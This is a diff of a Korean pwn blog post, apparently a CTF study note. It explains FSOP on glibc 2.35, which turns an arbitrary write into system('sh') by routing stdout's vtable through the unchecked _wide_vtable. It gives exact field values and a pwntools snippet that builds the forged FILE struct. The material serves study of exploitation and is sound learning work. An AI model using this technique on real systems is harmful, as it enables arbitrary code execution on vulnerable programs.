@@ -1,16 +1,19 @@
 ---
 published: true
 layout: post
+title: "AAW to RCE - [FSOP]"
 category: pwn
 tags:
-  - pwn
+  - [FSOP]
 excerpt_separator: <!--more-->
 ---
 glibc 2.34부터 malloc, free hook이 없어지면서 libc leak + AAW가 가능할 때에도 RIP Control이 조금 더 어려워졌다. 
 glibc 2.35에서도 안정적으로 `system("sh")`가 가능한 FSOP에 대해 알아보자.
 <!--more-->
+<br/>
+<br/>
 
-## `_IO_FILE` struct
+## `_IO_FILE`  struct
 
 ---
 
@@ -26,7 +29,8 @@ int main()
 ```
 FSOP를 사용하기 위해서 FILE 구조체가 IO 함수에서 어떻게 사용되는지 파악해야 한다.
 fopen에서 반환되어 fp가 가리키는 FILE 구조체는 다음과 같이 생겼다. 
-
+<br/>
+<br/>
 
 ```c
 // https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/FILE.h#L6
@@ -67,8 +71,10 @@ type = struct _IO_FILE {
 }
 ```
 
-`FILE` (=`_IO_FILE`)은 gdb에서 `ptype struct [struct name]` 으로 확인할 수 있다.
+`FILE(=_IO_FILE)`은 gdb에서 `ptype struct [struct name]` 으로 확인할 수 있다.
 stream의 입력, 출력을 위한 여러 멤버 변수들이 존재하는데 필요한 변수에 대해서만 이후에 살펴보자.
+<br/>
+<br/>
 
 
 ## `stdout` vs `_IO_2_1_stdout_`  
@@ -104,6 +110,8 @@ libc_hidden_data_def (_IO_list_all)
 ```
 
 `_IO_2_1_stdout_`은 libio/stdfiles.c에서 정의된다. `_IO_FILE_plus` 자료형으로 선언되며 `_IO_FILE` 내 `chain` 포인터로 `_IO_2_1_stdin_, stdout_, stderr_`가 연결되어 있는 것을 확인할 수 있다.
+<br/>
+<br/>
 
 
 ```c
@@ -114,6 +122,8 @@ struct _IO_FILE_plus {
 }
 ```
 `_IO_FILE_plus`는 `FILE` 구조체에 `_IO_jump_t` vtable이 추가된 버전이다. vtable이 어떻게 사용되며 검증되는지는 이후에 다룰 예정이다. 다시 stdout으로 넘어가자.
+<br/>
+<br/>
 
 ```c
 // https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/stdio.c#L33
@@ -126,12 +136,15 @@ FILE *stderr = (FILE *) &_IO_2_1_stderr_;
 정리하면 data 영역의 `stdout`은 libc 영역의 `_IO_2_1_stdout_`을 가리키는 `FILE*` (=`_IO_FILE*`) 포인터이다.
 실제 `_IO_2_1_stdout_`은 `_IO_FILE` 구조체에 더해 `_IO_jump_t` vtable을 갖고 있다.
 `_IO_FILE_plus`로 정의한 `_IO_2_1_stdout_` 을 `FILE* stdout`으로 포장하여 stdio.h에서 제공하고 있다.
+<br/>
+<br/>
 
-
-![stdout.png]({{site.baseurl}}/_posts/stdout.png)
+![stdout.png](/assets/img/stdout.png)
 
 위와 같이 GDB로 각 구조체의 멤버변수 값을 런타임에 확인할 수 있다.
-
+<br/>
+<br/>
+<br/>
 
 ## puts로 살펴보는 vtable 참조
 ---
@@ -160,6 +173,8 @@ libc_hidden_def (_IO_puts)
 
 ```
 `puts`는 위와 같이 정의되어 있다. 이후 FSOP에 사용할 `_IO_sputn`의 정의를 자세히 살펴보면 
+<br/>
+<br/>
 
 
 ```c
@@ -172,6 +187,8 @@ libc_hidden_def (_IO_puts)
 
 `_IO_sputn` -> `_IO_XSPUTN` -> `JUMP2(__xsputn, ...)` -> `_IO_JUMPS_FUNC(THIS)->__xsputn` 인 것을 확인할 수 있다.
 이때 `_IO_JUMPS_FUNC` = `IO_validate_vtable`에서 vtable에 대한 검증이 존재하는 것을 확인할 수 있다.
+<br/>
+<br/>
 
 
 ```c
@@ -193,6 +210,8 @@ IO_validate_vtable (const struct _IO_jump_t *vtable)
 }
 ```
 넘겨준 vtable이 libc의 vtable section 안에 존재하는지 검증한다. 검증에 성공할 경우 인자로 받았던 vtable 포인터를 그대로 반환하여 멤버 함수를 참조한다. 이 검증이 없었을 때에는 vtable을 fake table로 바꿔주기만 하면 RCE가 가능했다. 
+<br/>
+<br/>
 
 ```c
 // https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L293
@@ -223,6 +242,8 @@ struct _IO_jump_t
 };
 ```
 `_IO_jump_t` 타입의 vtable은 위와 같이 생겼다. 앞서 실행 흐름을 다시 살펴보면 `_IO_sputn` -> `_IO_XSPUTN` -> `JUMP2(__xsputn, ...)` -> `_IO_JUMPS_FUNC(THIS)->__xsputn`이었다.
+<br/>
+<br/>
 
 puts를 실행할 때를 기준으로 정리하면 `_IO_2_1_stdout_.vtable->__xsputn`이 호출되는 것이다. FSOP는 vtable 검증을 우회하고 임의 함수를 실행하기 위해  
 
@@ -230,8 +251,11 @@ puts를 실행할 때를 기준으로 정리하면 `_IO_2_1_stdout_.vtable->__xs
 2. vtable section 내의 vtable 중 하나인 `_wide_vtable`을 참조할 때는 검증이 존재하지 않는다.
 
 위의 두 가지를 이용한다.
+<br/>
+<br/>
 
-
+## `_wide_vtable`의 검증 부재
+---
 ```c
 // https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wgenops.c#L363
 void
@@ -248,6 +272,8 @@ _IO_wdoallocbuf (FILE *fp)
 libc_hidden_def (_IO_wdoallocbuf)
 ```
 `_wide_vtable`을 참조하는 내부 루틴 중 하나인 `_IO_WDOALLOCATE`을 살펴보면
+<br/>
+<br/>
 
 ```c
 // https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L223
@@ -270,40 +296,47 @@ libc_hidden_def (_IO_wdoallocbuf)
 
 ```
 
-`#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable((THIS)))` : 
-앞서 살펴본 `_IO_FILE_JUMPS`에서 검증을 진행했던 것과 달리 바로 포인터로 캐스팅해주는 것을 확인할 수 있다.
+`#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable((THIS)))`  
+<br/>
+
+앞서 살펴본 `_IO_FILE_JUMPS`에서는 검증을 진행했던 것과 다르게 바로 포인터로 캐스팅해주는 것을 확인할 수 있다.
+<br/>
+<br/>
 
 이를 이용해서 FSOP는
 1. `_IO_2_1_stdout_.vtable`이 `_wide_vtable`을 가리키도록 한다. 
 (구체적으로 이 포스트에서 다루는 FSOP path에서는 정확히 `_IO_2_1_stdout_.vtable->__xsputn == _IO_wfile_jumps->_IO_file_overflow`가 되도록 한다.)
 
 
-2. `_IO_wfile_jumps->_IO_file_overflow`에서 호출하는 내부 루틴이 `_wide_vtable`을 참조하게 될텐데 
+2. `_IO_wfile_jumps->_IO_file_overflow`에서 호출하는 내부 루틴이 `_wide_vtable`을 참조하게 될텐데, 
+<br/>
 
-```
-// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L101
+```c
 #define _IO_WIDE_JUMPS(THIS) \
   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
 ```
 이때 내부 루틴에서 참조하는 `_wide_vtable`은 `_IO_2_1_stdout_._wide_data->_wide_vtable`에 해당하며,
 libc leak + AAW로 `_IO_2_1_stdout_._wide_data`를 자유롭게 덮을 수 있는 상황을 가정하고 있다.
+<br/>
 
-따라서 내부 루틴에서 참조하는 `wide_vtable`이 fake table을 가리키도록 할 수 있다.
+따라서 내부 루틴에서 검증없이 참조하는 `wide_vtable`이 fake table을 가리키도록 할 수 있다.
 
+<br/>
 
 ## Code Flow
 ---
-이제 FSOP가 의도하는 코드 흐름을 살펴보자. 
-
-앞서 미리 적은 것처럼
+이제 FSOP가 의도하는 코드 흐름을 살펴보자. 앞서 미리 적은 것처럼
 1. `_IO_puts`에서 `_IO_sputn`을 호출하는데, 이때 `_IO_2_1_stdout`의 vtable이 `_wide_vtable`을 가리키도록 덮어 `_IO_wfile_overflow`을 호출한다. `_IO_wfile_overflow`은 차례로 `_IO_wdoallocbuf`, `_IO_WDOALLOCATE (fp)`을 호출한다.
 
 2. `_IO_WDOALLOCATE (fp)`에서 `_wide_vtable`에 대한 검증이 없기 때문에 fake table을 사용하여 `system()`을 호출한다.
+<br/>
 
 정리하면 다음과 같다.
 `_IO_puts` → (`_IO_sputn` , corrupted vtable) → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE (fp)`
 
 코드 흐름에서 constraints가 몇 가지 존재하여 코드와 같이 정리했다.
+<br/>
+<br/>
 
 ### puts
 ---
@@ -327,9 +360,10 @@ _IO_puts (const char *str)
 }
 ```
 * Constraints
-1. `_IO_acquire_lock`이 있어 `_IO_2_1_stdout`의 멤버변수 lock이 rw 영역을 가리켜야 한다. (이렇게만 주면 충분 - libc.symbols['_IO_2_1_stdout_'] + 0x10) 
-2. `vtable->__xsputn == `_IO_wfile_overflow`
-`_IO_2_1_stdout`의 vtable을 덮어 `_IO_sputn`을 호출했을 때 `_IO_wfile_jumps->__overflow`에 해당하는 `_IO_wfile_overflow`이 호출되도록 한다.
+1. `_IO_acquire_lock`이 있어 `_IO_2_1_stdout`의 멤버변수 lock이 rw 영역을 가리켜야 한다.<br/>(이렇게만 주면 충분 - libc.symbols['_IO_2_1_stdout_'] + 0x10) <br/>
+2. `vtable->__xsputn == _IO_wfile_overflow`<br/> `_IO_2_1_stdout`의 vtable을 덮어 `_IO_sputn`을 호출했을 때 `_IO_wfile_jumps->__overflow`에 해당하는 `_IO_wfile_overflow`이 호출되도록 한다.
+<br/>
+<br/>
 
 ### _IO_wfile_overflow
 
@@ -360,6 +394,8 @@ _IO_wfile_overflow (FILE *f, wint_t wch)
 1. `f->_flags & _IO_NO_WRITES == 0`
 2. `f->_flags & _IO_CURRENTLY_PUTTING == 0`
 3. `f->_wide_data->_IO_write_base == 0`
+<br/>
+<br/>
 
 
 ### _IO_wdoallocbuf
@@ -381,6 +417,8 @@ _IO_wdoallocbuf (FILE *fp)
 1. `fp->_wide_data->_IO_buf_base == 0`
 2. `fp->_flags & _IO_UNBUFFERED == 0`
 3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`
+<br/>
+<br/>
 
 
 ## Constraints
@@ -402,6 +440,8 @@ _IO_wdoallocbuf (FILE *fp)
 3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`
 
 이제 fp의 각 인자에 대해 제약 조건을 정리하자.
+<br/>
+<br/>
 
 ### fp→vtable
 
@@ -443,6 +483,8 @@ gef➤  ptype /o _IO_wfile_jumps
 
 ⇒ `fp->vtable = libc['_IO_wfile_jumps'] - 0x20`
 으로 설정하면 `vtable->__xsputn`이 정확히 `_IO_wfile_jumps - 0x20 + 0x56 == _IO_wfile_jumps.__overflow` ⇒ `_IO_wfile_overflow` 을 가리킴.
+<br/>
+<br/>
 
 ### fp→_flags
 
@@ -462,6 +504,8 @@ gef➤  ptype /o _IO_wfile_jumps
 코드 흐름의 가장 마지막에서 `_IO_WDOALLOCATE (fp)`가 호출되는데, `_IO_FILE`의 첫번째 멤버 변수인 `_flags`를 통해 RDI에 sh를 넣을 수 있다. 하위 2바이트를 `\x01\x01` 으로 구성하면 null이 들어가지 않게 검증을 통과할 수 있다.
 
 `fp._flags` → `b"\x01\x01;sh;\x00\x00”` 로 구성하여 최종 단계에서 RDI에 `\x01\x01;sh;`가 들어가도록 하자.
+<br/>
+<br/>
 
 ### fp→_wide_data
 
@@ -544,20 +588,31 @@ type = struct _IO_FILE {
 
 `*(QWORD*)fp->_unused2[12] = (QWORD)&fp->_unused2-104, *(QWORD*)&fp->_unused2= &libc_system`으로 설정했다.
 
+<br/>
+<br/>
+
 
 ## 결론
 ---
 `fp->_flags == b"\x01\x01;sh;\x00\x00"`
+
 `fp->_lock == libc.symbols['_IO_2_1_stdout_'] + 0x10`
+
 `fp->vtable = libc['_IO_wfile_jumps'] - 0x20`
+<br/>
+<br/>
 
 `fp->_wide_data = libc.symbols['_IO_2_1_stdout_'] - 16`
+
 `fp->_IO_read_ptr == 0`
+
 `fp->_IO_write_base == 0`
+
 `fp->_unused2 = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104)`
 
 이렇게 stdout을 구성하면 system("sh")를 호출할 수 있다. 
-
+<br/>
+<br/>
 
 ```python
 libc.address = libc_base
@@ -597,10 +652,12 @@ FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
         )
 ```
 이를 코드로 정리하면 위와 같다.
-FSOP_struct()의 경우 @qwerty님이 화햇 예선 디스코드에 올리신 걸 그대로 썼다 ^.^
+`FSOP_struct()`의 경우 @qwerty님이 화햇 예선 디스코드에 올리신 걸 그대로 썼다 ^.^
+<br/>
+<br/>
 
 ## Reference
 ---
-https://niftic.ca/posts/fsop/
+[Deep dive into FSOP](https://niftic.ca/posts/fsop/)
 
-https://blog.kylebot.net/2022/10/22/angry-FSROP/
+[Angry-FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/)
